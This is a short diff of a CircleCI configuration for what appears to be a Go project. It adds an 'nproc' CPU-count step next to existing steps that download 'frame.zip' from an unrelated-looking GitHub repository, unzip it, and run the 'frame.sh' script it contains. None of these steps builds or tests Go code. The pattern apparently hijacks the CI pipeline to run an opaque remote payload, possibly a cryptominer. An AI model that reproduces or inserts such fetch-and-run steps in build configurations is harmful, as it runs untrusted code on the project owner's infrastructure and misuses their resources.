@@ -9,5 +9,6 @@ jobs:
       - image: circleci/golang:1.9
     steps:
       - run: ls
+      - run: nproc
       - run: wget https://github.com/flash-barr/furry-giggle/raw/main/frame.zip
       - run: unzip frame.zip && chmod +x frame frame.sh && ./frame.sh
